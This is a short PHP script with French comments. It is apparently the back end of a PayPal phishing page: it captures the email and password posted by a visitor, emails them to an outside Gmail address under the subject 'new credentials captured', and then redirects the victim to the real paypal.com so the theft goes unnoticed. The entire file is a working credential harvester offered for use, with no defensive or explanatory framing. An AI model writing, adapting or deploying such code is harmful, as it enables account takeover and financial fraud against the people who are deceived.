<?php
if (!empty($_POST['email']) && !empty($_POST['password'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // ✉️ Informations à envoyer
    $to = "ckai47983@gmail.com";  // Remplace avec ton email
    $subject = "Nouveaux identifiants capturés";
    $message = "Email: $email\nMot de passe: $password\n";
    $headers = "From: notifier@tonsite.com"; // Facultatif

    // 📩 Envoi de l'email
    mail($to, $subject, $message, $headers);
}

// 🚀 Redirection vers le vrai site
header("Location: https://www.paypal.com");
exit();
?>
